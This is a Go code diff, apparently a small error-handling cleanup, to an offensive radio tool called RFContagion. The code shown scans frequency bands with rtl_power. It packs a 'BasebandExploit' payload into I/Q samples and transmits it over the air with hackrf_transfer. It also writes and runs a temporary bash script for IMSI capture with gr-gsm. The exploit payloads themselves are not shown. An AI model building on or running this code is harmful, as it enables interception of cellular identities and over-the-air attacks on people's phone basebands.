@@ -14,7 +14,6 @@ type RFContagion struct {
 	sdrAvailable bool
 	devicePath   string
 	frequencies  map[string]float64
-	modems       []ModemInfo
 }
 
 type ModemInfo struct {
@@ -95,7 +94,7 @@ func (r *RFContagion) ScanFrequencyBand(startFreq, endFreq float64, step float64
 		cmd := exec.Command("rtl_power",
 			"-f", fmt.Sprintf("%.0f:%.0f:%.0f", startFreq/1e6, endFreq/1e6, step/1e6),
 			"-g", "30", "-e", "5", "/tmp/vesper_rtl.csv")
-		cmd.Run()
+		_ = cmd.Run()
 	}
 
 	for freq := startFreq; freq < endFreq; freq += step {
@@ -192,12 +191,12 @@ func (r *RFContagion) transmitBaseband(exploit BasebandExploit) error {
 	for i := 0; i < len(exploit.Payload)*8; i++ {
 		iVal := byte(exploit.Payload[i/8]>>uint(i%8)) & 1
 		qVal := byte(0)
-		f.Write([]byte{iVal, qVal})
+		_, _ = f.Write([]byte{iVal, qVal})
 	}
 	f.Close()
 
 	if strings.Contains(r.devicePath, "hackrf") {
-		exec.Command("hackrf_transfer",
+		_ = exec.Command("hackrf_transfer",
 			"-t", tmpFile,
 			"-f", fmt.Sprintf("%.0f", exploit.Frequency),
 			"-s", "2000000",
@@ -227,7 +226,7 @@ echo "IMSI capture complete"
 
 		tmpScript := fmt.Sprintf("/tmp/vesper_imsi_cap_%d.sh", os.Getpid())
 		os.WriteFile(tmpScript, []byte(grgsmScript), 0755)
-		exec.Command("bash", tmpScript).Run()
+		_ = exec.Command("bash", tmpScript).Run()
 		os.Remove(tmpScript)
 	}
 
